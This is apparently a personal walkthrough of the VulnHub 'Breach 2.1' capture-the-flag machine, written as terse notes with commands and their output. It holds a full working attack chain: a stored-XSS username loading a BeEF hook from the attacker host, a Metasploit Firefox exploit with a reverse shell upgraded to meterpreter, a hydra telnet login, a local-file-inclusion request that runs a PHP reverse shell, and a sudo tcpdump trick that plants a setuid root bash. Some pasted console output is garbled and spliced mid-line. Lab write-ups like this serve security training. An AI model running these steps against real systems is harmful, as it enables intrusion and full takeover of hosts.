<https://www.vulnhub.com/entry/breach-21,159/>

<https://www.hackingarticles.in/hack-breach-2-1-vm-ctf-challenge/>

<https://g0blin.co.uk/breach-2.1-vulnhub-writeup/>

<https://reedphish.wordpress.com/2016/10/16/breach-2-1-walkthrough/>


> A hint: Imagine this as a production environment during a busy work day.


Keyswords: sstd_config, SSH ForceCommand, .bashrc, .profile , sudoers, telnet


# nmap

## First scan

	$ sudo nmap -p- -Pn -n 192.168.110.151
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-30 16:44 CET
	Nmap scan report for 192.168.110.151
	Host is up (0.00015s latency).
	Not shown: 65530 closed tcp ports (reset)
	PORT      STATE SERVICE
	111/tcp   open  rpcbind
	41311/tcp open  unknown
	65535/tcp open  unknown
	MAC Address: 08:00:27:5D:AF:A9 (Oracle VirtualBox virtual NIC)

	Nmap done: 1 IP address (1 host up) scanned in 1.53 seconds



## Try to connect to ssh server
	
	└─$ ssh -t peter@192.168.110.151 -p65535 /bin/bash --norc --noprofile
	#############################################################################
	#                  Welcome to Initech Cyber Consulting, LLC                 #
	#                 All connections are monitored and recorded                #
	#                     Unauthorized access is encouraged                     #
	#             Peter, if that's you - the password is in the source.         # <== USER peter, PASSWD : inthesource
	#          Also, stop checking your blog all day and enjoy your vacation!   # 
	#############################################################################
	peter@192.168.110.151's password: inthesource
	Connection to 192.168.110.151 closed.

==> Connection closed


## Second scan

	$ sudo nmap -p- -Pn -n 192.168.110.151
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-30 16:44 CET
	Nmap scan report for 192.168.110.151
	Host is up (0.00015s latency).
	Not shown: 65530 closed tcp ports (reset)
	PORT      STATE SERVICE
	80/tcp    open  http
	111/tcp   open  rpcbind
	65535/tcp open  unknown
	MAC Address: 08:00:27:5D:AF:A9 (Oracle VirtualBox virtual NIC)

	Nmap done: 1 IP address (1 host up) scanned in 1.53 seconds

==> Port 80 is opened

# Search Sploit

	$ searchsploit  blogphp                                                                                                     
	------------------------------------------------------------------------ ---------------------------------
	 Exploit Title                                                          |  Path
	------------------------------------------------------------------------ ---------------------------------
	BlogPHP 1.0 - 'index.php' SQL Injection                                 | php/webapps/27099.txt
	BlogPHP 1.2 - Multiple SQL Injections                                   | php/webapps/27117.txt
	BlogPHP 2 - 'id' Cross-Site Scripting / SQL Injection                   | php/webapps/5042.py
	BlogPHP 2.0 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities | php/webapps/31774.txt
	BlogPHP 2.0 - Persistent Cross-Site Scripting                           | php/webapps/17640.txt <== HERE
	BlogPHP 2.0 - Privilege Escalation / SQL Injection                      | php/webapps/5909.pl
	------------------------------------------------------------------------ ---------------------------------

## xss attack and gain metepreter shell

## beef-xss
	
	$ sudo beef-xss

## Register a new user

	http://192.168.110.151/blog/register.html
	Username : <script src="http://192.168.110.1:3000/hook.js"></script>


## exploit with msfconsole

	use exploit/multi/browser/firefox_proto_crmfrequest
	set paypload generic/shell_reverse_tcp
	set srvhost 192.168.110.1
	set uripath shell
	set lhost 192.168.110.1
	exploit

	# In interface BeEF http://127.0.0.1:3000/ui/panel
	Online Browsers --> Command --> Redirect Browser --> Redirect URL : http://192.168.110.1:8080/shell
	 
	use post/multi/manage/shell_to_meterpreter
	set session 1
	run


The screen capture

	msf6 >  use exploit/multi/browser/firefox_proto_crmfrequest
	[*] No payload configured, defaulting to generic/shell_reverse_tcp
	msf6 exploit(multi/browser/firefox_proto_crmfrequest) >  set paypload generic/shell_reverse_tcp
	paypload => generic/shell_reverse_tcp
	msf6 exploit(multi/browser/firefox_proto_crmfrequest) >  set srvhost 192.168.110.1
	srvhost => 192.168.110.1
	msf6 exploit(multi/browser/firefox_proto_crmfrequest) >  set uripath shell
	uripath => shell
	msf6 exploit(multi/browser/firefox_proto_crmfrequest) >  set lhost 192.168.110.1
	lhost => 192.168.110.1
	msf6 exploit(multi/browser/firefox_proto_crmfrequest) >  exploit
	[*] Exploit running as background job 0.
	[*] Exploit completed, but no session was created.
	msf6 exploit(multi/browser/firefox_proto_crmfrequest) >  
	[*] Started reverse TCP handler on 192.168.110.1:4444 
	[*] Using URL: http://192.168.110.1:8080/shell
	[*] Server started.
	[*] 192.168.110.151  firefox_proto_crmfrequest - Gathering target information for 192.168.110.151
	[*] 192.168.110.151  firefox_proto_crmfrequest - Sending HTML response to 192.168.110.151
	[*] 192.168.110.151  firefox_proto_crmfrequest - Sending HTML
	[*] 192.168.110.151  firefox_proto_crmfrequest - Sending the malicious addon
	[*] Command shell session 1 opened (192.168.110.1:4444 -> 192.168.110.151:51644 ) at 2021-11-30 16:01:39 +0100

	msf6 exploit(multi/browser/firefox_proto_crmfrequest) > sessions

	Active sessions
	===============

	  Id  Name  Type                   Information  Connection
	  --  ----  ----                   -----------  ----------
	  1         shell firefox/firefox               192.168.110.1:4444 -> 192.168.110.151:51644  (192.168.110.151)

	msf6 exploit(multi/browser/firefox_proto_crmfrequest) > use post/multi/manage/shell_to_meterpreter
	msf6 post(multi/manage/shell_to_meterpreter) > set session 1
	session => 1
	msf6 post(multi/manage/shell_to_meterpreter) > run

	[!] SESSION may not be compatible with this module:
	[!]  * incompatible session platform: firefox
	[*] Upgrading session ID: 1
	[*] Starting exploit/multi/handler
	[*] Started reverse TCP handler on 192.168.110.1:4433 
	[*] Sending stage (984904 bytes) to 192.168.110.151
	[*] Meterpreter session 2 opterpreter > sysinfo
	Computer     : 192.168.110.151
	OS           : Debian 8.5 (Linux 3.16.0-4-amd64)
	Architecture : x64
	BuildTuple   : i486-linux-musl
	Metened (192.168.110.1:4433 -> 192.168.110.151:53816 ) at 2021-11-30 16:02:31 +0100
	[*] Command stager progress: 100.00% (773/773 bytes)
	[*] Post module execution completed
	msf6 post(multi/manage/shell_to_meterpreter) > sessions

	Active sessions
	===============

	  Id  Name  Type                   Information              Connection
	  --  ----  ----                   -----------              ----------
	  1         shell firefox/firefox                           192.168.110.1:4444 -> 192.168.110.151:51644  (192.168.110.151)
	  2         meterpreter x86/linux  peter @ 192.168.110.151  192.168.110.1:4433 -> 192.168.110.151:53816  (192.168.110.151)

	msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
	[*] Starting interaction with 2...

	meterpreter > sysinfo
	Computer     : 192.168.110.151
	OS           : Debian 8.5 (Linux 3.16.0-4-amd64)
	Architecture : x64
	BuildTuple   : i486-linux-musl
	Meterpreter  : x86/linux


# Post exploit

## Unlock user peter

### crontab 

	$ crontab -l
	*/4 * * * * cd /home/peter && ./firefox.sh
	
	cat firefox.sh
	xvfb-run --auto-servernum --server-num=1 /opt/firefox/firefox http://192.168.110.151/blog/members.html

### File .bashrc

	cat .bashrc
	# ~/.bashrc: executed by bash(1) for non-login shells.
	# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
	# for examples

	# If not running interactively, don't do anything
	case $- in
	    *i*) ;;
	      *) return;;
	esac

	# don't put duplicate lines or lines starting with space in the history.
	# See bash(1) for more options
	HISTCONTROL=ignoreboth

	# append to the history file, don't overwrite it
	shopt -s histappend

	# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
	HISTSIZE=1000
	HISTFILESIZE=2000

	# check the window size after each command and, if necessary,
	# update the values of LINES and COLUMNS.
	shopt -s checkwinsize

	# If set, the pattern "**" used in a pathname expansion context will
	# match all files and zero or more directories and subdirectories.
	#shopt -s globstar

	# make less more friendly for non-text input files, see lesspipe(1)
	#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

	# set variable identifying the chroot you work in (used in the prompt below)
	if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
	    debian_chroot=$(cat /etc/debian_chroot)
	fi


### Modify .bashrc

	echo 'exec sh ' > /home/peter/.bashrc

## ssh connection with peter

	└─$ ssh peter@192.168.110.151 -p 65535
	#############################################################################
	#                  Welcome to Initech Cyber Consulting, LLC                 #
	#                 All connections are monitored and recorded                #
	#                     Unauthorized access is encouraged                     #
	#             Peter, if that's you - the password is in the source.         #
	#          Also, stop checking your blog all day and enjoy your vacation!   # 
	#############################################################################
	peter@192.168.110.151's password: inthesource

	$ sudo -l
	Matching Defaults entries for peter on breach2:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User peter may run the following commands on breach2:
	    (root) NOPASSWD: /etc/init.d/apache2

	$ netstat -tnl
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State
	tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN
	tcp        0      0 0.0.0.0:41311           0.0.0.0:*               LISTEN
	tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
	tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN
	tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN
	tcp6       0      0 :::47334                :::*                    LISTEN
	tcp6       0      0 :::111                  :::*                    LISTEN
	tcp6       0      0 :::80                   :::*                    LISTEN


## forward port

	ssh -N -f -L 2323:127.0.0.1:2323 peter@192.168.110.151 -p 65535


## Scan port 2323 on localhost

	$ sudo nmap -sV -sT 127.0.0.1 -p2323
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-01 11:02 CET
	Nmap scan report for localhost (127.0.0.1)
	Host is up (0.000054s latency).

	PORT     STATE SERVICE VERSION
	2323/tcp open  telnet  Linux telnetd
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds

## Bruteforce telnet with hydra
	
	$ hydra -l milton -p Houston telnet://127.0.0.1:2323
	Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-01 11:03:39
	[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
	[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
	[DATA] attacking telnet://127.0.0.1:2323/
	[2323][telnet] host: 127.0.0.1   login: milton   password: Houston  <== HERE
	1 of 1 target successfully completed, 1 valid password found
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-01 11:03:39


## Connect to milton account with telnel

	$ telnet localhost 2323
	Trying ::1...
	Trying 127.0.0.1...
	Connected to localhost.
	Escape character is '^]'.
	29 45'46" N 95 22'59" W 
	breach2 login: milton
	Password: 
	Last login: Wed Jul 20 21:04:18 EDT 2016 from localhost on pts/0
	Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
	29 45'46" N 95 22'59" W 
	3
	2
	1
	Whose stapler is it?mine
	Woot!
	milton@breach2:~$ id
	uid=1002(milton) gid=1002(milton) groups=1002(milton)


	$ grep -rl stapler /usr 2>/dev/null
	/usr/share/hunspell/en_US.dic
	/usr/share/dict/american-english
	/usr/local/bin/cd.py <== HERE

	$ $ cat /usr/local/bin/cd.py
	#!/usr/bin/python

	import signal
	import time
	import os

	s = signal.signal(signal.SIGINT, signal.SIG_IGN)

	countdown=3

	while countdown >0:
	        time.sleep(1)
	        print(countdown)
	        countdown -=1
	if countdown <1:
	        question = raw_input("Whose stapler is it?")
	if question == "mine":
	        os.system("echo 'Woot!'")
	else:

	        os.system("kill -9 %d"%(os.getppid()))
	        signal.signal(signal.SIGINT, s)

	
	milton@breach2:~$ netstat  -tnlp
	(Not all processes could be identified, non-owned process info
	 will not be shown, you would have to be root to see it all.)
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
	tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -               
	tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               
	tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
	tcp        0      0 0.0.0.0:52490           0.0.0.0:*               LISTEN      -               
	tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
	tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -               
	tcp6       0      0 :::8888                 :::*                    LISTEN      -               
	tcp6       0      0 :::111                  :::*                    LISTEN      -               
	tcp6       0      0 :::52496                :::*                    LISTEN      -  


==> Port 8888 is openned


### Exploit with milton
	
	# $ cat .profile
	*# ~/.profile: executed by the command interpreter for login shells.
	# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
	# exists.
	# see /usr/share/doc/bash/examples/startup-files for examples.
	# the files are located in the bash-doc package.

	# the default umask is set in /etc/profile; for setting the umask
	# for ssh logins, install and configure the libpam-umask package.
	#umask 022

	# if running bash
	if [ -n "$BASH_VERSION" ]; then
	    # include .bashrc if it exists
	    if [ -f "$HOME/.bashrc" ]; then
	        . "$HOME/.bashrc"
	    fi
	fi

	# set PATH so it includes user's private bin if it exists
	if [ -d "$HOME/bin" ] ; then
	    PATH="$HOME/bin:$PATH"
	fi

	python /usr/local/bin/cd.py
	sudo /etc/init.d/nginx start &> /dev/null

	sudo() {
	      echo "Sorry, user milton may not run sudo on breach2."
	}
	readonly -f sudo


### The port 8888 is openned

	milton@breach2:~$ netstat  -tnlp
	(Not all processes could be identified, non-owned process info
	 will not be shown, you would have to be root to see it all.)
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
	tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -               
	tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               
	tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
	tcp        0      0 0.0.0.0:58220           0.0.0.0:*               LISTEN      -               
	tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
	tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -               
	tcp6       0      0 :::8888                 :::*                    LISTEN      -               
	tcp6       0      0 :::111                  :::*                    LISTEN      -               
	tcp6       0      0 :::49108                :::*                    LISTEN      - 



### exploit web service on 8888

#### Configuration nginx

	milton@breach2:/var/www$ cat /etc/nginx/sites-available/default
	##
	# You should look at the following URL's in order to grasp a solid understanding
	# of Nginx configuration files in order to fully unleash the power of Nginx.
	# http://wiki.nginx.org/Pitfalls
	# http://wiki.nginx.org/QuickStart
	# http://wiki.nginx.org/Configuration
	#
	# Generally, you will want to move this file somewhere, and start with a clean
	# file but keep this around for reference. Or just disable in sites-enabled.
	#
	# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
	##

	# Default server configuration
	#
	server {
	    listen 8888 default_server;
	    listen [::]:8888 default_server;

	    root /var/www/html2;

	    # Add index.php to the list if you are using PHP
	    index index.html index.php index.htm;

	    server_name your_domain;

	    location / {
	        # First attempt to serve request as file, then
	        # as directory, then fall back to displaying a 404.
	        try_files $uri $uri/ =404;
	        autoindex on;
	    }

	    location ~ \.php$ {
	            try_files $uri =404;
	            fastcgi_split_path_info ^(.+\.php)(/.+)$;
	            fastcgi_pass unix:/var/run/php5-fpm.sock;
	            fastcgi_index index.php;
	            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
	            include fastcgi_params;
	        }

	    # deny access to .htaccess files, if Apache's document root
	    # concurs with nginx's one
	    #
	    #location ~ /\.ht {
	    #   deny all;
	    #}
	}


#### Configuration php5-fpm


	milton@breach2:/etc/php5/fpm/pool.d$ grep -v  -e "^$" -e "^;" -e '^[[:space:]]*$' www.conf 
	[www]
	user = blumbergh
	group = blumbergh
	listen = /var/run/php5-fpm.sock
	listen.owner = www-data
	listen.group = www-data
	pm = dynamic
	pm.max_children = 5
	pm.start_servers = 2
	pm.min_spare_servers = 1
	pm.max_spare_servers = 3
	chdir = /
	milton@breach2:/etc/php5/fpm/pool.d$ 

#### Exploit oscommerce 3.0a5


	$ searchsploit oscommerce 3.0
	------------------------------------------------------------- ---------------------------------
	 Exploit Title                                               |  Path
	------------------------------------------------------------- ---------------------------------
	osCommerce 2.2/3.0 - 'oscid' Session Fixation                | php/webapps/32887.txt
	osCommerce 3.0.2 - Persistent Cross-Site Scripting           | php/webapps/18455.txt
	osCommerce 3.0a5 - Local File Inclusion / HTML Injection     | php/webapps/33913.html
	------------------------------------------------------------- ---------------------------------
	Shellcodes: No Result

#### Install a web shell and get a access to blumbergh account

	milton@breach2:/tmp$ curl http://192.168.110.151:8888/oscommerce/admin/includes/applications/services/pages/uninstall.php?module=../../../../../../../../../../../../tmp/php-reverse-shell


# Get root

	$ COMMAND='cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash'
	TF=$(mktemp)
	echo "$COMMAND" > $TF
	chmod +x $TF
	sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z $TF -Z root$ $ $ $ 
	dropped privs to root
	tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
	Maximum file limit reached: 1
	$ ls /tmp/bash  
	/tmp/bash
	$ ls -al /tmp/bash
	-rwsr-xr-x 1 root root 1029624 Nov 30 10:14 /tmp/bash
	$ /tmp/bash -p
	id
	uid=1001(blumbergh) gid=1001(blumbergh) euid=0(root) groups=1001(blumbergh),1004(fin)


# Box's install

## sshd_config

	cat /etc/ssh/sshd_config
	...
	AllowUsers peter
	ForceCommand /usr/bin/startme
	AddressFamily inet

	cat /usr/bin/startme
	#!/bin/bash

	sudo /etc/init.d/apache2 start &> /dev/null

## milton's `.profile`
	
	milton@breach2:~$ cat .profile 
	# ~/.profile: executed by the command interpreter for login shells.
	# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
	# exists.
	# see /usr/share/doc/bash/examples/startup-files for examples.
	# the files are located in the bash-doc package.

	# the default umask is set in /etc/profile; for setting the umask
	# for ssh logins, install and configure the libpam-umask package.
	#umask 022

	# if running bash
	if [ -n "$BASH_VERSION" ]; then
	    # include .bashrc if it exists
	    if [ -f "$HOME/.bashrc" ]; then
	        . "$HOME/.bashrc"
	    fi
	fi

	# set PATH so it includes user's private bin if it exists
	if [ -d "$HOME/bin" ] ; then
	    PATH="$HOME/bin:$PATH"
	fi

	python /usr/local/bin/cd.py
	sudo /etc/init.d/nginx start &> /dev/null

	sudo() {
		echo "Sorry, user milton may not run sudo on breach2."
	}
	readonly -f sudo



## /etc/xinetd.d/initech
	
	root@breach2:~# cat /etc/xinetd.d/initech
	# default: on

	service initech

	{ 

	disable = no
	flags = REUSE
	socket_type = stream
	wait = no
	user = root
	server = /usr/sbin/in.telnetd
	log_on_failure += USERID
	bind = 127.0.0.1
	only_from = 127.0.0.1 
	port = 2323
	banner = /etc/motd
	}
	bind = 127.0.0.1
	only_from = 127.0.0.1
	port = 2424

